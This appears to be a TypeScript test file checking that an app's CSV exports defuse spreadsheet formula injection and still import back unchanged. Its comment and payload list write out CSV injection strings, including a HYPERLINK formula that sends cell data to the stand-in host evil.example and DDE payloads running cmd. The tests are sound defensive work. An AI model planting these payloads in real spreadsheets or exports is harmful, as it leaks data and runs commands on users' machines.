/// <reference types="node" />
// QA-WEB-03 — CSV exports open in spreadsheets: a cell written by any member that starts with
// = + - @ (or tab / carriage return) is evaluated as a formula by Excel / LibreOffice / Sheets
// (=HYPERLINK("https://evil.example/?"&A2;"Cliquez") leaks the neighbouring cells, DDE payloads…).
import { describe, test } from 'node:test';
import assert from 'node:assert/strict';
import Papa from 'papaparse';
import { buildCsv, parseCsv } from './csv';
import { parseCsv as parseArchiveCsv, toCsv } from '../../io/csv';
import { makeContext, makeRow, prop } from './testFixtures';

const ctx = makeContext();
const PAYLOADS = ['=HYPERLINK("https://evil.example/?"&A2,"Cliquez")', '+cmd|\' /C calc\'!A0', '-2+3+cmd|\' /C calc\'!A0', '@SUM(A1)', '\t=1+1', '\r=1+1'];

/** Data rows as a spreadsheet reads them (quotes removed, nothing else). */
const fields = (csv: string) => Papa.parse<string[]>(csv.replace(/^\ufeff/, ''), { skipEmptyLines: 'greedy' }).data.slice(1);

describe('QA-WEB-03: CSV exports neutralize spreadsheet formulas', () => {
  test('database view export (buildCsv)', () => {
    const rows = PAYLOADS.map((p, i) => makeRow(`r${i}`, p, { notes: p, prix: -12.5 }));
    for (const delimiter of [',', ';'] as const) {
      const csv = buildCsv(rows, [prop('title'), prop('notes'), prop('prix')], ctx, delimiter);
      for (const [title, notes, prix] of fields(csv)) {
        assert.ok(!/^[=+\-@\t\r]/.test(title!), `title cell ${JSON.stringify(title)}`);
        assert.ok(!/^[=+\-@\t\r]/.test(notes!), `text cell ${JSON.stringify(notes)}`);
        // Numbers stay numbers.
        assert.equal(prix, delimiter === ';' ? '-12,5' : '-12.5');
      }
      // Importing the export back gives the original texts.
      assert.deepEqual(
        parseCsv(csv).rows.map((r) => r[1]),
        PAYLOADS,
      );
    }
  });

  test('ordinary values are unchanged', () => {
    const row = makeRow('ok', 'Cadrage', { notes: 'a = b', prix: 3 });
    const csv = buildCsv([row], [prop('title'), prop('notes'), prop('prix')], ctx, ',');
    assert.deepEqual(fields(csv)[0], ['Cadrage', 'a = b', '3']);
  });

  test('workspace archive export (toCsv)', () => {
    const csv = toCsv([['Nom', 'Montant'], ...PAYLOADS.map((p) => [p, '-4'])]);
    for (const [name, amount] of fields(csv)) {
      assert.ok(!/^[=+\-@\t\r]/.test(name!), `cell ${JSON.stringify(name)}`);
      assert.equal(amount, '-4');
    }
    assert.deepEqual(
      parseArchiveCsv(csv).slice(1).map((r) => r[0]),
      PAYLOADS,
    );
  });
});
